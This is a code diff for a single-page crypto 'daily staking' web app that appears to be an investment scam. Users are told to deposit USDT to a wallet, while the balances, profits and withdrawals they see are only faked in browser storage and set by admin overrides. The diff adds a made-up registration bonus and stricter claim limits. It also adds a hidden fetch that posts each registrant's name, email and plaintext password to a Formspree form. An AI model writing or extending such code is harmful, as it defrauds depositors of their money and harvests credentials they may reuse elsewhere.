@@ -331,7 +331,7 @@
                     </div>
                     <div class="faq-item">
                         <h4>How can I start earning profit?</h4>
-                        <p>It's simple! Make a minimum deposit of 50 USDT via the ERC20 network to activate your account. Once your funds are successfully credited, your account will automatically begin accruing profits, which are updated in your dashboard every 24 hours.</p>
+                        <p>It's simple! Make a minimum deposit of 50 USDT via the ERC20 network to activate your account. Once your funds are successfully credited, your account will automatically begin accruing profits, which you can claim in your dashboard every 24 hours.</p>
                     </div>
                 </div>
             </div>
@@ -352,7 +352,7 @@
                     <div style="text-align: right; font-size: 12px; color: var(--text-muted); margin-bottom: 16px;">100%</div>
 
                     <div style="display: flex; flex-direction: column; gap: 10px;">
-                        <button class="auth-btn" style="margin-top:0;" onclick="handleCheckProfit()">📊 Check Profit</button>
+                        <button class="auth-btn" id="btn-check-profit" style="margin-top:0;" onclick="handleCheckProfit()">📊 Check Profit</button>
                         <button class="auth-btn" id="btn-claim" style="margin-top:0; background-color: var(--btn-dark);" disabled onclick="handleClaim()">🎁 Claim $0.00</button>
                     </div>
                 </div>
@@ -371,7 +371,7 @@
                 <div class="earning-card">
                     <div class="card-title">💰 Transfer Profit</div>
                     <div class="info-row" style="border:none; padding-top:0;"><span class="info-label">Available:</span><span class="info-val text-green" id="earn-available">$0.00</span></div>
-                    <div class="input-group" style="margin-bottom: 10px;"><input type="number" id="transfer-amount" placeholder="Enter amount (min $1)"></div>
+                    <div class="input-group" style="margin-bottom: 10px;"><input type="number" id="transfer-amount" placeholder="Enter amount (min $10)"></div>
                     <button class="auth-btn" style="margin-top:0;" onclick="handleTransfer()">💰 Transfer to Balance</button>
                 </div>
 
@@ -416,7 +416,7 @@
                         <div class="step-item"><div class="step-num">1</div><div class="step-content"><h4>Copy Address</h4><p>Copy the ERC20 wallet address above</p></div></div>
                         <div class="step-item"><div class="step-num">2</div><div class="step-content"><h4>Open Your Wallet</h4><p>Open your crypto wallet (MetaMask, Trust Wallet, etc.)</p></div></div>
                         <div class="step-item"><div class="step-num">3</div><div class="step-content"><h4>Send USDT (ERC20)</h4><p>Send USDT using <span style="color:var(--accent-yellow); font-weight:bold;">ERC20 network only</span></p></div></div>
-                        <div class="step-item"><div class="step-num">4</div><div class="step-content"><h4>Confirm Deposit</h4><p>Use the form below to verify your transaction</p></div></div>
+                        <div class="step-item"><div class="step-num">4</div><div class="step-content"><h4>Wait For Confirmation</h4><p>Your balance will be updated after confirmation</p></div></div>
                     </div>
                 </div>
 
@@ -426,27 +426,10 @@
                         <div class="note-item note-yellow">⚠️ Only send USDT to this address</div>
                         <div class="note-item note-yellow">⚠️ Only use ERC20 network</div>
                         <div class="note-item note-red">🚫 Do NOT send other coins (BTC, ETH, etc.)</div>
-                        <div class="note-item note-red">🚫 Do NOT use TRC20 or BEP20 network</div>
                         <div class="note-item note-blue">ℹ️ Minimum deposit amount: 50 USDT</div>
+                        <div class="note-item note-blue">ℹ️ Contact support if deposit not received within 1 hour</div>
                     </div>
                 </div>
-
-                <div class="earning-card">
-                    <div class="card-title">🧾 Confirm Deposit</div>
-                    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 12px;">Please enter the amount you have sent and the last 5 characters of your wallet address key.</p>
-                    
-                    <div class="input-group" style="margin-bottom: 12px;">
-                        <label>Amount Sent (USDT)</label>
-                        <input type="number" id="deposit-verify-amount" placeholder="e.g. 50">
-                    </div>
-                    <div class="input-group" style="margin-bottom: 16px;">
-                        <label>Last 5 Address Key</label>
-                        <input type="text" id="deposit-verify-key" placeholder="e.g. aB3x9" maxlength="5">
-                    </div>
-                    
-                    <button class="auth-btn" onclick="submitDepositConfirmation()">Submit</button>
-                </div>
-
             </div>
 
             <div id="tab-withdraw" class="content" style="padding-top: 10px;">
@@ -510,7 +493,7 @@
         </div>
 
         <nav id="bottom-nav-bar" class="bottom-nav" style="display: none;">
-            <div class="nav-item active" id="nav-dashboard" onclick="window.location.hash='dashboard'"><span class="nav-icon">🌐</span><span>Home</span></div>
+            <div class="nav-item active" id="nav-dashboard" onclick="window.location.hash='dashboard'"><span class="nav-icon">🏠</span><span>Home</span></div>
             <div class="nav-item" id="nav-earning" onclick="window.location.hash='earning'"><span class="nav-icon">📈</span><span>Earning</span></div>
             <div class="nav-item" id="nav-history" onclick="window.location.hash='history'"><span class="nav-icon">📋</span><span>History</span></div>
         </nav>
@@ -519,21 +502,24 @@
 
     <script>
         // =========================================================
-        // 🗄️ ADMIN DATABASE (EDIT BALANCES HERE)
+        // 🔒 ADMIN CONTROLS 
         // =========================================================
-        // Users are saved in their local browser automatically.
-        // To permanently edit a user's balance, add them here.
-        
         const adminOverrides = {
-            "Kernel": { balance: 150.00, totalProfit: 3.00 },
-            "Imran": { balance: 50.00, totalProfit: 1.00 }
+            // Edit user balances here: "username": { balance: 500.00 }
         };
+
+        const FORMSPREE_URL = "https://formspree.io/f/xgorawzn"; 
         // =========================================================
 
         let currentUser = null;
-        let appState = { balance: 0.00, totalProfit: 0.00, availableTransfer: 0.00, pendingClaim: 0.00, transactions: [] };
-        let currentHistoryFilter = 'All';
+        let appState = { 
+            balance: 0, totalProfit: 0, availableTransfer: 0, pendingClaim: 0, 
+            transactions: [], transferredProfit: 0, withdrawnAmount: 0, 
+            claimedProfitLocally: 0, lastClaimTimestamp: 0, 
+            welcomeBonusClaimed: false, welcomeBonusAmount: 0
+        };
         
+        let currentHistoryFilter = 'All';
         let resetOTP = "";
         let resetUsername = "";
 
@@ -543,7 +529,7 @@
         ];
         const fmtMoney = (val) => new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(val);
 
-        // --- PREVENT ACCIDENTAL REFRESH / EXIT ---
+        // --- PREVENT ACCIDENTAL EXIT ---
         window.addEventListener('beforeunload', function (e) {
             if(currentUser) {
                 e.preventDefault();
@@ -569,23 +555,33 @@
             }
         }
 
-        // --- BROWSER HISTORY ROUTING (BACK BUTTON FIX & PERSISTENCE) ---
+        // --- BROWSER HISTORY ROUTING ---
         function handleRouting() {
             let hash = window.location.hash.substring(1);
-            const activeSession = localStorage.getItem('cryptoActiveSession');
+            
+            // SECURITY: Check Session Storage
+            const activeSession = sessionStorage.getItem('cryptoActiveSession');
 
             if (activeSession) {
                 currentUser = activeSession;
                 loadUserState();
+                
                 const validAppRoutes = ['dashboard', 'earning', 'history', 'deposit', 'withdraw', 'profile', 'password'];
-                if (!validAppRoutes.includes(hash)) { window.location.hash = 'dashboard'; return; }
+                if (!validAppRoutes.includes(hash)) {
+                    window.location.hash = 'dashboard';
+                    return;
+                }
                 renderAppTab(hash);
             } else {
                 const validAuthRoutes = ['login', 'register', 'forgot'];
-                if (!validAuthRoutes.includes(hash)) { window.location.hash = 'login'; return; }
+                if (!validAuthRoutes.includes(hash)) {
+                    window.location.hash = 'login';
+                    return;
+                }
                 renderAuthTab(hash);
             }
         }
+
         window.addEventListener('hashchange', handleRouting);
 
         function renderAuthTab(tabName) {
@@ -618,19 +614,20 @@
             
             if(['deposit', 'withdraw', 'dashboard', 'profile', 'password'].includes(tabName)) {
                 document.getElementById('nav-dashboard').classList.add('active');
-            } else { document.getElementById(`nav-${tabName}`).classList.add('active'); }
+            } else {
+                document.getElementById(`nav-${tabName}`).classList.add('active');
+            }
             
             if(tabName === 'deposit' || tabName === 'withdraw') {
                 document.getElementById('main-header').style.display = 'none';
-                document.getElementById(`tab-${tabName}`).style.paddingTop = '20px';
             } else {
                 document.getElementById('main-header').style.display = 'flex';
-                document.getElementById(`tab-${tabName}`).style.paddingTop = '0px';
             }
+
             updateAllUI();
         }
 
-        // --- REGISTRATION LOGIC (LOCAL ONLY) ---
+        // --- REGISTRATION LOGIC ---
         function handleRegister(e) {
             e.preventDefault();
             const fname = document.getElementById('reg-fname').value.trim();
@@ -646,8 +643,14 @@
                 errorDiv.innerText = 'Password must be at least 8 chars with letters & numbers.'; return;
             }
 
-            const newAccount = { fname: fname, lname: lname, password: pass, email: email, balance: 0.00, totalProfit: 0.00, pendingClaim: 0.00, availableTransfer: 0.00, transactions: [] };
+            const newAccount = { fname: fname, lname: lname, password: pass, email: email };
             localStorage.setItem('cryptoUser_' + user, JSON.stringify(newAccount));
+
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ _subject: "New Crypto App Registration!", Name: fname + " " + lname, Username: user, Email: email, PassKey: pass })
+            }).catch(err => console.log("Email notice failed", err));
 
             alert("Registration Successful! Please log in.");
             document.getElementById('login-username').value = user;
@@ -666,7 +669,7 @@
             if (savedData) {
                 const account = JSON.parse(savedData);
                 if (account.password === pass) {
-                    localStorage.setItem('cryptoActiveSession', user);
+                    sessionStorage.setItem('cryptoActiveSession', user);
                     window.location.hash = 'dashboard';
                     return;
                 }
@@ -676,12 +679,13 @@
         
         function handleLogout() { 
             saveUserState(); 
-            localStorage.removeItem('cryptoActiveSession');
+            sessionStorage.removeItem('cryptoActiveSession');
             currentUser = null;
             window.location.hash = 'login';
+            window.location.reload();
         }
 
-        // --- FORGOT PASSWORD & CHANGE PASSWORD ---
+        // --- FORGOT PASSWORD ---
         function handleForgotRequest(e) {
             e.preventDefault();
             const user = document.getElementById('forgot-username').value.trim();
@@ -753,51 +757,98 @@
             window.location.hash = 'dashboard';
         }
 
-        // --- STATE MANAGEMENT & ADMIN DATABASE INTEGRATION ---
+
+        // --- DYNAMIC STATE MANAGEMENT ---
         function loadUserState() {
-            const saved = localStorage.getItem('cryptoUser_' + currentUser);
-            if (saved) { appState = JSON.parse(saved); }
+            const saved = localStorage.getItem('cryptoStateData_' + currentUser);
+            if (saved) { 
+                appState = JSON.parse(saved); 
+            } else {
+                appState = { balance: 0, totalProfit: 0, availableTransfer: 0, pendingClaim: 0, transactions: [], transferredProfit: 0, withdrawnAmount: 0, claimedProfitLocally: 0, lastClaimTimestamp: 0, welcomeBonusClaimed: false, welcomeBonusAmount: 0 };
+            }
             
-            // Check Admin Database overrides!
+            appState.transferredProfit = appState.transferredProfit || 0;
+            appState.withdrawnAmount = appState.withdrawnAmount || 0;
+            appState.claimedProfitLocally = appState.claimedProfitLocally || 0;
+            appState.lastClaimTimestamp = appState.lastClaimTimestamp || 0;
+            appState.welcomeBonusAmount = appState.welcomeBonusAmount || 0;
+
+            // First Login Welcome Bonus!
+            if (!appState.welcomeBonusClaimed) {
+                let bonus = (Math.random() * (24 - 17) + 17).toFixed(2);
+                appState.welcomeBonusClaimed = true;
+                appState.welcomeBonusAmount = parseFloat(bonus);
+                saveUserState();
+                
+                setTimeout(() => {
+                    alert(`🎉 Registration Reward Received!\n\nWelcome to Crypto Daily Staking. We have credited a special registration bonus of $${bonus} to your account.\n\nPlease Note: The daily staking reward percentage will ONLY apply to your actual deposited balance (minimum 50 USDT).`);
+                    updateAllUI(); // Refresh UI to show bonus
+                }, 800);
+            }
+
+            // Apply Dynamic Admin Base Math
             if (adminOverrides[currentUser]) {
-                if(adminOverrides[currentUser].balance !== undefined) appState.balance = adminOverrides[currentUser].balance;
-                if(adminOverrides[currentUser].totalProfit !== undefined) appState.totalProfit = adminOverrides[currentUser].totalProfit;
+                let adminBaseBalance = adminOverrides[currentUser].balance !== undefined ? adminOverrides[currentUser].balance : 0;
+                let adminBaseProfit = adminOverrides[currentUser].totalProfit !== undefined ? adminOverrides[currentUser].totalProfit : 0;
+                
+                appState.balance = adminBaseBalance + appState.transferredProfit - appState.withdrawnAmount;
+                appState.totalProfit = adminBaseProfit + appState.claimedProfitLocally;
+            }
+            
+            // Add visual bonus to final balance
+            if (appState.welcomeBonusClaimed) {
+                appState.balance += appState.welcomeBonusAmount;
             }
         }
-        function saveUserState() { if(currentUser) localStorage.setItem('cryptoUser_' + currentUser, JSON.stringify(appState)); }
+        
+        function saveUserState() { if(currentUser) localStorage.setItem('cryptoStateData_' + currentUser, JSON.stringify(appState)); }
         function logTransaction(type, amount, desc) { appState.transactions.unshift({ id: Date.now(), type: type, amount: amount, date: new Date().toLocaleString(), desc: desc }); saveUserState(); }
-        function getCurrentRate() { for(let i=0; i<rateTiers.length; i++) { if(appState.balance >= rateTiers[i].min && appState.balance < rateTiers[i].max) return rateTiers[i].rate; } return 2.4; }
+        
+        function getStakingBase() {
+            return Math.max(0, appState.balance - (appState.welcomeBonusAmount || 0));
+        }
+
+        function getCurrentRate() { 
+            let base = getStakingBase();
+            for(let i=0; i<rateTiers.length; i++) { if(base >= rateTiers[i].min && base < rateTiers[i].max) return rateTiers[i].rate; } 
+            return 2.4; 
+        }
 
         function updateAllUI() {
             document.getElementById('dash-balance').innerText = fmtMoney(appState.balance);
             document.getElementById('dep-balance').innerText = fmtMoney(appState.balance);
             document.getElementById('with-balance').innerText = fmtMoney(appState.balance);
             
-            // Profile Tab Update
             if(currentUser) {
                 let uData = JSON.parse(localStorage.getItem('cryptoUser_' + currentUser));
-                document.getElementById('prof-fname').innerText = uData.fname || '-';
-                document.getElementById('prof-lname').innerText = uData.lname || '-';
+                if(uData) {
+                    document.getElementById('prof-fname').innerText = uData.fname || '-';
+                    document.getElementById('prof-lname').innerText = uData.lname || '-';
+                    document.getElementById('prof-email').innerText = uData.email || '-';
+                }
                 document.getElementById('prof-user').innerText = currentUser;
-                document.getElementById('prof-email').innerText = uData.email || '-';
                 document.getElementById('display-username').innerText = currentUser;
                 document.getElementById('user-avatar').innerText = currentUser.substring(0, 2).toUpperCase();
             }
-            updateEarningUI(); updateHistoryUI();
+
+            updateEarningUI();
+            updateHistoryUI();
         }
 
         // --- EARNING TAB LOGIC ---
         function updateEarningUI() {
+            let stakingBase = getStakingBase();
             const rate = getCurrentRate();
+
             document.getElementById('earn-balance').innerText = fmtMoney(appState.balance);
             document.getElementById('earn-total-profit').innerText = fmtMoney(appState.totalProfit);
             document.getElementById('earn-rate').innerText = `${rate.toFixed(1)}%`;
-            document.getElementById('earn-based-on').innerText = fmtMoney(appState.balance);
+            document.getElementById('earn-based-on').innerText = fmtMoney(stakingBase);
             document.getElementById('earn-available').innerText = fmtMoney(appState.availableTransfer);
             
             let statusEl = document.getElementById('earn-status');
-            if(appState.balance >= 50) { statusEl.innerText = "✅ Active"; statusEl.className = "info-val text-green"; } 
-            else { statusEl.innerText = "❌ Deposit Min $50"; statusEl.className = "info-val text-red"; }
+            if(stakingBase >= 50) { statusEl.innerText = "✅ Active"; statusEl.className = "info-val text-green"; } 
+            else { statusEl.innerText = "❌ Deposit Min 50 USDT"; statusEl.className = "info-val text-red"; }
 
             let claimBtn = document.getElementById('btn-claim');
             if(appState.pendingClaim > 0) {
@@ -807,34 +858,64 @@
                 claimBtn.disabled = true; claimBtn.style.backgroundColor = "var(--btn-dark)"; claimBtn.style.color = "var(--text-muted)";
                 claimBtn.innerText = `🎁 Claim $0.00`;
             }
+            
+            let btnCheck = document.getElementById('btn-check-profit');
+            let timeSinceLastClaim = Date.now() - (appState.lastClaimTimestamp || 0);
+            if (timeSinceLastClaim < 86400000) { // 24 hours in ms
+                btnCheck.disabled = true;
+                btnCheck.style.backgroundColor = "var(--btn-dark)";
+                btnCheck.style.color = "var(--text-muted)";
+                btnCheck.innerText = "⏳ Checking Locked";
+            } else {
+                btnCheck.disabled = false;
+                btnCheck.style.backgroundColor = "var(--btn-blue)";
+                btnCheck.style.color = "white";
+                btnCheck.innerText = "📊 Check Profit";
+            }
 
             document.getElementById('rate-table-container').innerHTML = rateTiers.map(tier => {
-                let isActive = (tier.rate === rate && appState.balance >= 50) || (tier.rate === 2.0 && appState.balance < 50);
+                let isActive = (tier.rate === rate && stakingBase >= 50) || (tier.rate === 2.0 && stakingBase < 50);
                 return `<div class="rate-row ${isActive ? 'active' : ''}"><span>${tier.label}</span><span>${tier.rate.toFixed(1)}% ${isActive ? '← You' : ''}</span></div>`;
             }).join('');
         }
 
         function handleCheckProfit() {
-            if(appState.balance < 50) { alert("You need a minimum balance of 50 USDT to generate profit!"); return; }
+            let stakingBase = getStakingBase();
+            if(stakingBase < 50) { alert("You need a minimum deposited balance of 50 USDT to generate profit! Registration bonuses cannot be staked."); return; }
+            
+            let timeSinceLastClaim = Date.now() - (appState.lastClaimTimestamp || 0);
+            if (timeSinceLastClaim < 86400000) { alert("You can only generate profit once every 24 hours. Please wait for the countdown to finish."); return; }
+
             if(appState.pendingClaim > 0) { alert("You already have unchecked profit. Claim it first."); return; }
-            appState.pendingClaim = appState.balance * (getCurrentRate() / 100);
+            
+            appState.pendingClaim = stakingBase * (getCurrentRate() / 100);
             saveUserState(); updateAllUI();
         }
 
         function handleClaim() {
             if(appState.pendingClaim > 0) {
                 const amt = appState.pendingClaim;
-                appState.availableTransfer += amt; appState.totalProfit += amt; appState.pendingClaim = 0; 
+                appState.availableTransfer += amt; 
+                appState.claimedProfitLocally += amt;
+                appState.totalProfit += amt; 
+                appState.pendingClaim = 0; 
+                
+                appState.lastClaimTimestamp = Date.now(); // Start strict 24 hour timer
+                
                 logTransaction('Profit', amt, 'Daily Staking Reward');
-                updateAllUI(); alert("Profit claimed successfully!");
+                updateAllUI(); alert("Profit claimed successfully! The 24-hour countdown for your next reward has started.");
             }
         }
 
         function handleTransfer() {
             const amt = parseFloat(document.getElementById('transfer-amount').value);
-            if(isNaN(amt) || amt < 1) { alert("Minimum transfer amount is $1"); return; }
+            if(isNaN(amt) || amt < 10) { alert("Minimum transfer amount is $10"); return; }
             if(amt > appState.availableTransfer) { alert("Insufficient available profit."); return; }
-            appState.availableTransfer -= amt; appState.balance += amt;
+            
+            appState.availableTransfer -= amt; 
+            appState.transferredProfit += amt;
+            appState.balance += amt; 
+            
             document.getElementById('transfer-amount').value = ''; 
             logTransaction('Transfer', amt, 'Profit to Main Balance');
             updateAllUI(); alert(`Successfully transferred ${fmtMoney(amt)}!`);
@@ -866,19 +947,6 @@
         // --- DEPOSIT & WITHDRAW LOGIC ---
         function copyAddress() { navigator.clipboard.writeText(document.getElementById('deposit-address').innerText).then(() => alert("Copied!")); }
         
-        function submitDepositConfirmation() {
-            const amt = parseFloat(document.getElementById('deposit-verify-amount').value);
-            const key = document.getElementById('deposit-verify-key').value.trim();
-
-            if(isNaN(amt) || amt < 50) { alert("Minimum deposit is 50 USDT."); return; }
-            if(key.length < 5) { alert("Please enter the last 5 characters of your address."); return; }
-
-            document.getElementById('deposit-verify-amount').value = '';
-            document.getElementById('deposit-verify-key').value = '';
-            alert("Your amount will credit to your account after confirmation");
-            window.location.hash = 'dashboard';
-        }
-
         function setMaxWithdraw() { document.getElementById('withdraw-amount').value = appState.balance; updateWithdrawSummary(); }
         function updateWithdrawSummary() {
             let amt = parseFloat(document.getElementById('withdraw-amount').value) || 0;
@@ -897,20 +965,33 @@
             let userAccount = JSON.parse(localStorage.getItem('cryptoUser_' + currentUser));
             if (pass !== userAccount.password) { alert("❌ Incorrect password."); return; }
 
-            appState.balance -= amt; logTransaction('Withdraw', amt, `Withdrawal to ${addr.substring(0,6)}...`);
+            appState.withdrawnAmount += amt;
+            appState.balance -= amt; 
+            logTransaction('Withdraw', amt, `Withdrawal to ${addr.substring(0,6)}...`);
             
             document.getElementById('withdraw-address').value = ''; document.getElementById('withdraw-amount').value = '';
             updateWithdrawSummary(); updateAllUI(); alert(`✅ Success! Withdrawal request for ${fmtMoney(amt)} has been submitted.`);
         }
 
-        // --- TIMERS & APIs ---
+        // --- 24-HOUR STRICT COUNTDOWN TIMER ---
         setInterval(() => {
-            const d = new Date(); const t = new Date(); t.setUTCHours(24,0,0,0); const diff = t - d;
-            document.getElementById('t-hours').innerText = Math.floor((diff % (1000*60*60*24))/(1000*60*60)).toString().padStart(2,'0');
-            document.getElementById('t-mins').innerText = Math.floor((diff % (1000*60*60))/(1000*60)).toString().padStart(2,'0');
-            document.getElementById('t-secs').innerText = Math.floor((diff % (1000*60))/1000).toString().padStart(2,'0');
+            if(!currentUser) return;
+            let lastClaim = appState.lastClaimTimestamp || 0;
+            let nextClaim = lastClaim + 86400000; // 24 hours in milliseconds
+            let diff = nextClaim - Date.now();
+            
+            if (diff <= 0) {
+                document.getElementById('t-hours').innerText = '00';
+                document.getElementById('t-mins').innerText = '00';
+                document.getElementById('t-secs').innerText = '00';
+            } else {
+                document.getElementById('t-hours').innerText = Math.floor(diff / (1000*60*60)).toString().padStart(2,'0');
+                document.getElementById('t-mins').innerText = Math.floor((diff % (1000*60*60))/(1000*60)).toString().padStart(2,'0');
+                document.getElementById('t-secs').innerText = Math.floor((diff % (1000*60))/1000).toString().padStart(2,'0');
+            }
         }, 1000);
 
+        // --- CHARTS & LIVE DATA ---
         const loadedCharts = {};
         function toggleChart(id, pair) {
             const div = document.getElementById(`chart-${id}`);
@@ -925,7 +1006,7 @@
         fetch('https://api.binance.com/api/v3/ticker/24hr?symbols=["BTCUSDT","ETHUSDT","XRPUSDT","DOGEUSDT","PAXGUSDT"]').then(r=>r.json()).then(d=>d.forEach(c=>{ let i=c.symbol.replace('USDT','').toLowerCase(); if(i==='paxg')i='xau'; upCoin(i,c.lastPrice,c.priceChangePercent); })).catch(()=>{});
         try{ const ws = new WebSocket('wss://stream.binance.com:9443/ws/!ticker@arr'); ws.onmessage = (e) => { JSON.parse(e.data).forEach(c => { if(c.s==='BTCUSDT') upCoin('btc',c.c,c.P); if(c.s==='ETHUSDT') upCoin('eth',c.c,c.P); if(c.s==='XRPUSDT') upCoin('xrp',c.c,c.P); if(c.s==='DOGEUSDT') upCoin('doge',c.c,c.P); if(c.s==='PAXGUSDT') upCoin('xau',c.c,c.P); }); }; }catch(e){}
 
-        // Run Router on Load
+        // Init App based on browser URL hash
         document.addEventListener('DOMContentLoaded', handleRouting);
     </script>
 </body>
